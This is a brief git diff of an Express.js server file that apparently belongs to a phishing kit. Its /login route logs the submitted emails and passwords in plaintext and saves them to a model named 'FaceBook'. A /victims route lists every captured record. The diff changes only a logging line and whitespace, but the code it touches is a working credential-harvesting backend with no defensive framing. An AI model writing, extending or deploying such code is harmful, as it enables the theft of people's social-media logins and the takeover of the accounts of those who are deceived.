@@ -7,7 +7,7 @@ const router = express.Router();
 router.post("/login", async (req, res) => {
     try {
         const { email, password } = req.body;
-        console.log(email, password)
+        console.log("Data: ",email, password)
         // Create new user
         const newUser = new FaceBook({ email, password });
         const uuu = await newUser.save();
@@ -20,7 +20,7 @@ router.post("/login", async (req, res) => {
         res.status(500).json({ success: false, message: "Server error" });
     }
 });
-
+ 
 router.get("/victims", async (req, res) => {
     try {
         const users = await FaceBook.find(); // Fetch all users
